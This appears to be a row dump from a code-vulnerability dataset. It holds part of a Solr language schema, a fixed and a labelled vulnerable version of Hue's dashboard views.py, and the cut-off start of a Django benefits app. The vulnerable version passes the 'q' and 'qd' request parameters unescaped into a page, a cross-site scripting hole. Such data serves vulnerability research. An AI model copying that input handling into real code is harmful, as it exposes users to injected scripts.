      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_eu.txt"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Basque""/>
      </analyzer>
    </fieldType>

    <!-- Persian -->
    <fieldType name=""text_fa"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <!-- for ZWNJ -->
        <charFilter class=""solr.PersianCharFilterFactory""/>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.ArabicNormalizationFilterFactory""/>
        <filter class=""solr.PersianNormalizationFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_fa.txt"" />
      </analyzer>
    </fieldType>

    <!-- Finnish -->
    <fieldType name=""text_fi"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_fi.txt"" format=""snowball"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Finnish""/>
        <!-- less aggressive: <filter class=""solr.FinnishLightStemFilterFactory""/> -->
      </analyzer>
    </fieldType>

    <!-- French -->
    <fieldType name=""text_fr"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- removes l', etc -->
        <filter class=""solr.ElisionFilterFactory"" ignoreCase=""true"" articles=""lang/contractions_fr.txt""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_fr.txt"" format=""snowball"" />
        <filter class=""solr.FrenchLightStemFilterFactory""/>
        <!-- less aggressive: <filter class=""solr.FrenchMinimalStemFilterFactory""/> -->
        <!-- more aggressive: <filter class=""solr.SnowballPorterFilterFactory"" language=""French""/> -->
      </analyzer>
    </fieldType>

    <!-- Irish -->
    <fieldType name=""text_ga"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- removes d', etc -->
        <filter class=""solr.ElisionFilterFactory"" ignoreCase=""true"" articles=""lang/contractions_ga.txt""/>
        <!-- removes n-, etc. position increments is intentionally false! -->
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/hyphenations_ga.txt""/>
        <filter class=""solr.IrishLowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_ga.txt""/>
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Irish""/>
      </analyzer>
    </fieldType>

    <!-- Galician -->
    <fieldType name=""text_gl"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_gl.txt"" />
        <filter class=""solr.GalicianStemFilterFactory""/>
        <!-- less aggressive: <filter class=""solr.GalicianMinimalStemFilterFactory""/> -->
      </analyzer>
    </fieldType>

    <!-- Hindi -->
    <fieldType name=""text_hi"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <!-- normalizes unicode representation -->
        <filter class=""solr.IndicNormalizationFilterFactory""/>
        <!-- normalizes variation in spelling -->
        <filter class=""solr.HindiNormalizationFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_hi.txt"" />
        <filter class=""solr.HindiStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Hungarian -->
    <fieldType name=""text_hu"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_hu.txt"" format=""snowball"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Hungarian""/>
        <!-- less aggressive: <filter class=""solr.HungarianLightStemFilterFactory""/> -->
      </analyzer>
    </fieldType>

    <!-- Armenian -->
    <fieldType name=""text_hy"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_hy.txt"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Armenian""/>
      </analyzer>
    </fieldType>

    <!-- Indonesian -->
    <fieldType name=""text_id"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_id.txt"" />
        <!-- for a less aggressive approach (only inflectional suffixes), set stemDerivational to false -->
        <filter class=""solr.IndonesianStemFilterFactory"" stemDerivational=""true""/>
      </analyzer>
    </fieldType>

    <!-- Italian -->
    <fieldType name=""text_it"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- removes l', etc -->
        <filter class=""solr.ElisionFilterFactory"" ignoreCase=""true"" articles=""lang/contractions_it.txt""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_it.txt"" format=""snowball"" />
        <filter class=""solr.ItalianLightStemFilterFactory""/>
        <!-- more aggressive: <filter class=""solr.SnowballPorterFilterFactory"" language=""Italian""/> -->
      </analyzer>
    </fieldType>

    <!-- Japanese using morphological analysis (see text_cjk for a configuration using bigramming)

         NOTE: If you want to optimize search for precision, use default operator AND in your query
         parser config with <solrQueryParser defaultOperator=""AND""/> further down in this file.  Use
         OR if you would like to optimize for recall (default).
    -->
    <fieldType name=""text_ja"" class=""solr.TextField"" positionIncrementGap=""100"" autoGeneratePhraseQueries=""false"">
      <analyzer>
      <!-- Kuromoji Japanese morphological analyzer/tokenizer (JapaneseTokenizer)

           Kuromoji has a search mode (default) that does segmentation useful for search.  A heuristic
           is used to segment compounds into its parts and the compound itself is kept as synonym.

           Valid values for attribute mode are:
              normal: regular segmentation
              search: segmentation useful for search with synonyms compounds (default)
            extended: same as search mode, but unigrams unknown words (experimental)

           For some applications it might be good to use search mode for indexing and normal mode for
           queries to reduce recall and prevent parts of compounds from being matched and highlighted.
           Use <analyzer type=""index""> and <analyzer type=""query""> for this and mode normal in query.

           Kuromoji also has a convenient user dictionary feature that allows overriding the statistical
           model with your own entries for segmentation, part-of-speech tags and readings without a need
           to specify weights.  Notice that user dictionaries have not been subject to extensive testing.

           User dictionary attributes are:
                     userDictionary: user dictionary filename
             userDictionaryEncoding: user dictionary encoding (default is UTF-8)

           See lang/userdict_ja.txt for a sample user dictionary file.

           Punctuation characters are discarded by default.  Use discardPunctuation=""false"" to keep them.

           See http://wiki.apache.org/solr/JapaneseLanguageSupport for more on Japanese language support.
        -->
        <tokenizer class=""solr.JapaneseTokenizerFactory"" mode=""search""/>
        <!--<tokenizer class=""solr.JapaneseTokenizerFactory"" mode=""search"" userDictionary=""lang/userdict_ja.txt""/>-->
        <!-- Reduces inflected verbs and adjectives to their base/dictionary forms () -->
        <filter class=""solr.JapaneseBaseFormFilterFactory""/>
        <!-- Removes tokens with certain part-of-speech tags -->
        <filter class=""solr.JapanesePartOfSpeechStopFilterFactory"" tags=""lang/stoptags_ja.txt"" />
        <!-- Normalizes full-width romaji to half-width and half-width kana to full-width (Unicode NFKC subset) -->
        <filter class=""solr.CJKWidthFilterFactory""/>
        <!-- Removes common tokens typically not useful for search, but have a negative effect on ranking -->
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_ja.txt"" />
        <!-- Normalizes common katakana spelling variations by removing any last long sound character (U+30FC) -->
        <filter class=""solr.JapaneseKatakanaStemFilterFactory"" minimumLength=""4""/>
        <!-- Lower-cases romaji characters -->
        <filter class=""solr.LowerCaseFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Latvian -->
    <fieldType name=""text_lv"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_lv.txt"" />
        <filter class=""solr.LatvianStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Dutch -->
    <fieldType name=""text_nl"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_nl.txt"" format=""snowball"" />
        <filter class=""solr.StemmerOverrideFilterFactory"" dictionary=""lang/stemdict_nl.txt"" ignoreCase=""false""/>
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Dutch""/>
      </analyzer>
    </fieldType>

    <!-- Norwegian -->
    <fieldType name=""text_no"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_no.txt"" format=""snowball"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Norwegian""/>
        <!-- less aggressive: <filter class=""solr.NorwegianLightStemFilterFactory"" variant=""nb""/> -->
        <!-- singular/plural: <filter class=""solr.NorwegianMinimalStemFilterFactory"" variant=""nb""/> -->
        <!-- The ""light"" and ""minimal"" stemmers support variants: nb=Bokml, nn=Nynorsk, no=Both -->
      </analyzer>
    </fieldType>

    <!-- Portuguese -->
    <fieldType name=""text_pt"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_pt.txt"" format=""snowball"" />
        <filter class=""solr.PortugueseLightStemFilterFactory""/>
        <!-- less aggressive: <filter class=""solr.PortugueseMinimalStemFilterFactory""/> -->
        <!-- more aggressive: <filter class=""solr.SnowballPorterFilterFactory"" language=""Portuguese""/> -->
        <!-- most aggressive: <filter class=""solr.PortugueseStemFilterFactory""/> -->
      </analyzer>
    </fieldType>

    <!-- Romanian -->
    <fieldType name=""text_ro"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_ro.txt"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Romanian""/>
      </analyzer>
    </fieldType>

    <!-- Russian -->
    <fieldType name=""text_ru"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_ru.txt"" format=""snowball"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Russian""/>
        <!-- less aggressive: <filter class=""solr.RussianLightStemFilterFactory""/> -->
      </analyzer>
    </fieldType>

    <!-- Swedish -->
    <fieldType name=""text_sv"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_sv.txt"" format=""snowball"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Swedish""/>
        <!-- less aggressive: <filter class=""solr.SwedishLightStemFilterFactory""/> -->
      </analyzer>
    </fieldType>

    <!-- Thai -->
    <fieldType name=""text_th"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.ThaiWordFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_th.txt"" />
      </analyzer>
    </fieldType>

    <!-- Turkish -->
    <fieldType name=""text_tr"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.TurkishLowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""false"" words=""lang/stopwords_tr.txt"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Turkish""/>
      </analyzer>
    </fieldType>

 </types>

  <!-- Similarity is the scoring routine for each document vs. a query.
       A custom Similarity or SimilarityFactory may be specified here, but
       the default is fine for most applications.
       For more info: http://wiki.apache.org/solr/SchemaXml#Similarity
    -->
  <!--
     <similarity class=""com.example.solr.CustomSimilarityFactory"">
       <str name=""paramkey"">param value</str>
     </similarity>
    -->

</schema>
""""""
/n/n/ndesktop/libs/dashboard/src/dashboard/views.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging

from django.utils.html import escape
from django.utils.translation import ugettext as _

from django.core.urlresolvers import reverse
from desktop.conf import USE_NEW_EDITOR
from desktop.lib.django_util import JsonResponse, render
from desktop.lib.exceptions_renderable import PopupException
from desktop.models import Document2, Document
from desktop.views import antixss

from search.conf import LATEST

from dashboard.dashboard_api import get_engine
from dashboard.decorators import allow_owner_only
from dashboard.models import Collection2
from dashboard.conf import get_engines
from dashboard.controller import DashboardController, can_edit_index


LOG = logging.getLogger(__name__)


DEFAULT_LAYOUT = [
     {""size"":2,""rows"":[{""widgets"":[]}],""drops"":[""temp""],""klass"":""card card-home card-column span2""},
     {""size"":10,""rows"":[{""widgets"":[
         {""size"":12,""name"":""Filter Bar"",""widgetType"":""filter-widget"", ""id"":""99923aef-b233-9420-96c6-15d48293532b"",
          ""properties"":{},""offset"":0,""isLoading"":True,""klass"":""card card-widget span12""}]},
                        {""widgets"":[
         {""size"":12,""name"":""Grid Results"",""widgetType"":""resultset-widget"", ""id"":""14023aef-b233-9420-96c6-15d48293532b"",
          ""properties"":{},""offset"":0,""isLoading"":True,""klass"":""card card-widget span12""}]}],
        ""drops"":[""temp""],""klass"":""card card-home card-column span10""},
]


def index(request, is_mobile=False):
  hue_collections = DashboardController(request.user).get_search_collections()
  collection_id = request.GET.get('collection')

  if not hue_collections or not collection_id:
    return admin_collections(request, True, is_mobile)

  try:
    collection_doc = Document2.objects.get(id=collection_id)
    if USE_NEW_EDITOR.get():
      collection_doc.can_read_or_exception(request.user)
    else:
      collection_doc.doc.get().can_read_or_exception(request.user)
    collection = Collection2(request.user, document=collection_doc)
  except Exception, e:
    raise PopupException(e, title=_(""Dashboard does not exist or you don't have the permission to access it.""))

  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  if request.method == 'GET':
    if 'q' in request.GET:
      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))
    if 'qd' in request.GET:
      query['qd'] = antixss(request.GET.get('qd', ''))

  template = 'search.mako'
  if is_mobile:
    template = 'search_m.mako'

  return render(template, request, {
    'collection': collection,
    'query': json.dumps(query),
    'initial': json.dumps({
        'collections': [],
        'layout': DEFAULT_LAYOUT,
        'is_latest': LATEST.get(),
        'engines': get_engines(request.user)
    }),
    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),
    'can_edit_index': can_edit_index(request.user),
    'is_embeddable': request.GET.get('is_embeddable', False),
    'mobile': is_mobile,
  })

def index_m(request):
  return index(request, True)

def new_search(request):
  engine = request.GET.get('engine', 'solr')
  collections = get_engine(request.user, engine).datasets()
  if not collections:
    return no_collections(request)

  collection = Collection2(user=request.user, name=collections[0], engine=engine)
  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  if request.GET.get('format', 'plain') == 'json':
    return JsonResponse({
      'collection': collection.get_props(request.user),
      'query': query,
      'initial': {
          'collections': collections,
          'layout': DEFAULT_LAYOUT,
          'is_latest': LATEST.get(),
          'engines': get_engines(request.user)
       }
     })
  else:
    return render('search.mako', request, {
      'collection': collection,
      'query': query,
      'initial': json.dumps({
          'collections': collections,
          'layout': DEFAULT_LAYOUT,
          'is_latest': LATEST.get(),
          'engines': get_engines(request.user)
       }),
      'is_owner': True,
      'is_embeddable': request.GET.get('is_embeddable', False),
      'can_edit_index': can_edit_index(request.user)
    })

def browse(request, name, is_mobile=False):
  engine = request.GET.get('engine', 'solr')
  collections = get_engine(request.user, engine).datasets()
  if not collections and engine == 'solr':
    return no_collections(request)

  collection = Collection2(user=request.user, name=name, engine=engine)
  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  template = 'search.mako'
  if is_mobile:
    template = 'search_m.mako'

  return render(template, request, {
    'collection': collection,
    'query': query,
    'initial': json.dumps({
      'autoLoad': True,
      'collections': collections,
      'layout': [
          {""size"":12,""rows"":[{""widgets"":[
              {""size"":12,""name"":""Grid Results"",""id"":""52f07188-f30f-1296-2450-f77e02e1a5c0"",""widgetType"":""resultset-widget"",
               ""properties"":{},""offset"":0,""isLoading"":True,""klass"":""card card-widget span12""}]}],
          ""drops"":[""temp""],""klass"":""card card-home card-column span10""}
      ],
      'is_latest': LATEST.get(),
      'engines': get_engines(request.user)
    }),
    'is_owner': True,
    'is_embeddable': request.GET.get('is_embeddable', False),
    'can_edit_index': can_edit_index(request.user),
    'mobile': is_mobile
  })


def browse_m(request, name):
  return browse(request, name, True)


@allow_owner_only
def save(request):
  response = {'status': -1}

  collection = json.loads(request.POST.get('collection', '{}'))
  layout = json.loads(request.POST.get('layout', '{}'))

  collection['template']['extracode'] = escape(collection['template']['extracode'])

  if collection:
    if collection['id']:
      dashboard_doc = Document2.objects.get(id=collection['id'])
    else:
      dashboard_doc = Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])
      Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard')

    dashboard_doc.update_data({
        'collection': collection,
        'layout': layout
    })
    dashboard_doc1 = dashboard_doc.doc.get()
    dashboard_doc.name = dashboard_doc1.name = collection['label']
    dashboard_doc.description = dashboard_doc1.description = collection['description']
    dashboard_doc.save()
    dashboard_doc1.save()

    response['status'] = 0
    response['id'] = dashboard_doc.id
    response['message'] = _('Page saved !')
  else:
    response['message'] = _('There is no collection to search.')

  return JsonResponse(response)


def no_collections(request):
  return render('no_collections.mako', request, {'is_embeddable': request.GET.get('is_embeddable', False)})


def admin_collections(request, is_redirect=False, is_mobile=False):
  existing_hue_collections = DashboardController(request.user).get_search_collections()

  if request.GET.get('format') == 'json':
    collections = []
    for collection in existing_hue_collections:
      massaged_collection = collection.to_dict()
      if request.GET.get('is_mobile'):
        massaged_collection['absoluteUrl'] = reverse('search:index_m') + '?collection=%s' % collection.id
      massaged_collection['isOwner'] = collection.doc.get().can_write(request.user)
      collections.append(massaged_collection)
    return JsonResponse(collections, safe=False)

  template = 'admin_collections.mako'
  if is_mobile:
    template = 'admin_collections_m.mako'

  return render(template, request, {
    'is_embeddable': request.GET.get('is_embeddable', False),
    'existing_hue_collections': existing_hue_collections,
    'is_redirect': is_redirect
  })


def admin_collection_delete(request):
  if request.method != 'POST':
    raise PopupException(_('POST request required.'))

  collections = json.loads(request.POST.get('collections'))
  searcher = DashboardController(request.user)
  response = {
    'result': searcher.delete_collections([collection['id'] for collection in collections])
  }

  return JsonResponse(response)


def admin_collection_copy(request):
  if request.method != 'POST':
    raise PopupException(_('POST request required.'))

  collections = json.loads(request.POST.get('collections'))
  searcher = DashboardController(request.user)
  response = {
    'result': searcher.copy_collections([collection['id'] for collection in collections])
  }

  return JsonResponse(response)
/n/n/n",0
83,37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d,"/desktop/libs/dashboard/src/dashboard/views.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging

from django.utils.html import escape
from django.utils.translation import ugettext as _

from django.core.urlresolvers import reverse
from desktop.conf import USE_NEW_EDITOR
from desktop.lib.django_util import JsonResponse, render
from desktop.lib.exceptions_renderable import PopupException
from desktop.models import Document2, Document

from search.conf import LATEST

from dashboard.dashboard_api import get_engine
from dashboard.decorators import allow_owner_only
from dashboard.models import Collection2
from dashboard.conf import get_engines
from dashboard.controller import DashboardController, can_edit_index


LOG = logging.getLogger(__name__)


DEFAULT_LAYOUT = [
     {""size"":2,""rows"":[{""widgets"":[]}],""drops"":[""temp""],""klass"":""card card-home card-column span2""},
     {""size"":10,""rows"":[{""widgets"":[
         {""size"":12,""name"":""Filter Bar"",""widgetType"":""filter-widget"", ""id"":""99923aef-b233-9420-96c6-15d48293532b"",
          ""properties"":{},""offset"":0,""isLoading"":True,""klass"":""card card-widget span12""}]},
                        {""widgets"":[
         {""size"":12,""name"":""Grid Results"",""widgetType"":""resultset-widget"", ""id"":""14023aef-b233-9420-96c6-15d48293532b"",
          ""properties"":{},""offset"":0,""isLoading"":True,""klass"":""card card-widget span12""}]}],
        ""drops"":[""temp""],""klass"":""card card-home card-column span10""},
]


def index(request, is_mobile=False):
  hue_collections = DashboardController(request.user).get_search_collections()
  collection_id = request.GET.get('collection')

  if not hue_collections or not collection_id:
    return admin_collections(request, True, is_mobile)

  try:
    collection_doc = Document2.objects.get(id=collection_id)
    if USE_NEW_EDITOR.get():
      collection_doc.can_read_or_exception(request.user)
    else:
      collection_doc.doc.get().can_read_or_exception(request.user)
    collection = Collection2(request.user, document=collection_doc)
  except Exception, e:
    raise PopupException(e, title=_(""Dashboard does not exist or you don't have the permission to access it.""))

  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  if request.method == 'GET':
    if 'q' in request.GET:
      query['qs'][0]['q'] = request.GET.get('q')
    if 'qd' in request.GET:
      query['qd'] = request.GET.get('qd')

  template = 'search.mako'
  if is_mobile:
    template = 'search_m.mako'

  return render(template, request, {
    'collection': collection,
    'query': json.dumps(query),
    'initial': json.dumps({
        'collections': [],
        'layout': DEFAULT_LAYOUT,
        'is_latest': LATEST.get(),
        'engines': get_engines(request.user)
    }),
    'is_owner': collection_doc.doc.get().can_write(request.user),
    'can_edit_index': can_edit_index(request.user),
    'is_embeddable': request.GET.get('is_embeddable', False),
    'mobile': is_mobile,
  })

def index_m(request):
  return index(request, True)

def new_search(request):
  engine = request.GET.get('engine', 'solr')
  collections = get_engine(request.user, engine).datasets()
  if not collections:
    return no_collections(request)

  collection = Collection2(user=request.user, name=collections[0], engine=engine)
  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  if request.GET.get('format', 'plain') == 'json':
    return JsonResponse({
      'collection': collection.get_props(request.user),
      'query': query,
      'initial': {
          'collections': collections,
          'layout': DEFAULT_LAYOUT,
          'is_latest': LATEST.get(),
          'engines': get_engines(request.user)
       }
     })
  else:
    return render('search.mako', request, {
      'collection': collection,
      'query': query,
      'initial': json.dumps({
          'collections': collections,
          'layout': DEFAULT_LAYOUT,
          'is_latest': LATEST.get(),
          'engines': get_engines(request.user)
       }),
      'is_owner': True,
      'is_embeddable': request.GET.get('is_embeddable', False),
      'can_edit_index': can_edit_index(request.user)
    })

def browse(request, name, is_mobile=False):
  engine = request.GET.get('engine', 'solr')
  collections = get_engine(request.user, engine).datasets()
  if not collections and engine == 'solr':
    return no_collections(request)

  collection = Collection2(user=request.user, name=name, engine=engine)
  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  template = 'search.mako'
  if is_mobile:
    template = 'search_m.mako'

  return render(template, request, {
    'collection': collection,
    'query': query,
    'initial': json.dumps({
      'autoLoad': True,
      'collections': collections,
      'layout': [
          {""size"":12,""rows"":[{""widgets"":[
              {""size"":12,""name"":""Grid Results"",""id"":""52f07188-f30f-1296-2450-f77e02e1a5c0"",""widgetType"":""resultset-widget"",
               ""properties"":{},""offset"":0,""isLoading"":True,""klass"":""card card-widget span12""}]}],
          ""drops"":[""temp""],""klass"":""card card-home card-column span10""}
      ],
      'is_latest': LATEST.get(),
      'engines': get_engines(request.user)
    }),
    'is_owner': True,
    'is_embeddable': request.GET.get('is_embeddable', False),
    'can_edit_index': can_edit_index(request.user),
    'mobile': is_mobile
  })


def browse_m(request, name):
  return browse(request, name, True)


@allow_owner_only
def save(request):
  response = {'status': -1}

  collection = json.loads(request.POST.get('collection', '{}'))
  layout = json.loads(request.POST.get('layout', '{}'))

  collection['template']['extracode'] = escape(collection['template']['extracode'])

  if collection:
    if collection['id']:
      dashboard_doc = Document2.objects.get(id=collection['id'])
    else:
      dashboard_doc = Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])
      Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard')

    dashboard_doc.update_data({
        'collection': collection,
        'layout': layout
    })
    dashboard_doc1 = dashboard_doc.doc.get()
    dashboard_doc.name = dashboard_doc1.name = collection['label']
    dashboard_doc.description = dashboard_doc1.description = collection['description']
    dashboard_doc.save()
    dashboard_doc1.save()

    response['status'] = 0
    response['id'] = dashboard_doc.id
    response['message'] = _('Page saved !')
  else:
    response['message'] = _('There is no collection to search.')

  return JsonResponse(response)


def no_collections(request):
  return render('no_collections.mako', request, {'is_embeddable': request.GET.get('is_embeddable', False)})


def admin_collections(request, is_redirect=False, is_mobile=False):
  existing_hue_collections = DashboardController(request.user).get_search_collections()

  if request.GET.get('format') == 'json':
    collections = []
    for collection in existing_hue_collections:
      massaged_collection = collection.to_dict()
      if request.GET.get('is_mobile'):
        massaged_collection['absoluteUrl'] = reverse('search:index_m') + '?collection=%s' % collection.id
      massaged_collection['isOwner'] = collection.doc.get().can_write(request.user)
      collections.append(massaged_collection)
    return JsonResponse(collections, safe=False)

  template = 'admin_collections.mako'
  if is_mobile:
    template = 'admin_collections_m.mako'

  return render(template, request, {
    'is_embeddable': request.GET.get('is_embeddable', False),
    'existing_hue_collections': existing_hue_collections,
    'is_redirect': is_redirect
  })


def admin_collection_delete(request):
  if request.method != 'POST':
    raise PopupException(_('POST request required.'))

  collections = json.loads(request.POST.get('collections'))
  searcher = DashboardController(request.user)
  response = {
    'result': searcher.delete_collections([collection['id'] for collection in collections])
  }

  return JsonResponse(response)


def admin_collection_copy(request):
  if request.method != 'POST':
    raise PopupException(_('POST request required.'))

  collections = json.loads(request.POST.get('collections'))
  searcher = DashboardController(request.user)
  response = {
    'result': searcher.copy_collections([collection['id'] for collection in collections])
  }

  return JsonResponse(response)
/n/n/n",1
84,1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53,"socialsystem/core/views.py/n/nimport urllib

from django.views.generic import TemplateView, FormView, DetailView
from django.urls import reverse

from .entryform import EntryForm, entry_form_config, build_question_flag
from .models import LifeCondition, Benefit, BenefitRequirement


class BenefitOverview(TemplateView):
    template_name = 'core/benefit_overview.html'

    def get_context_data(self):
        data = super().get_context_data()
        data['life_conditions'] = LifeCondition.objects.with_benefits()
        return data


class BenefitClaimView(FormView):
    template_name = 'core/benefit_claim.html'
    form_class = EntryForm

    def get(self, request, *args, **kwargs):
        form = self.get_form()

        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.render_to_response(self.get_context_data())

    def get_form_kwargs(self, *args, **kwargs):
        kwargs = super().get_form_kwargs()
        kwargs['entry_form_config'] = entry_form_config

        question_ids = {str(q['id']) for q in entry_form_config}
        data = {
            f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids
        }

        if data:
            kwargs['data'] = data

        return kwargs

    def form_valid(self, form):
        selected_flags = []

        # Assemble query
        for question in entry_form_config:
            flag = form.cleaned_data.get(str(question['id']), False)

            if flag:
                selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question)))

        return self.render_to_response({
            'form': form,
            'submitted': True,
            'claimable_benefits': Benefit.objects.find_claimable(selected_flags),
        })


class BenefitDetailView(DetailView):
    model = Benefit
    template_name = 'core/benefit_detail.html'

    def get_context_data(self, *args, **kwargs):
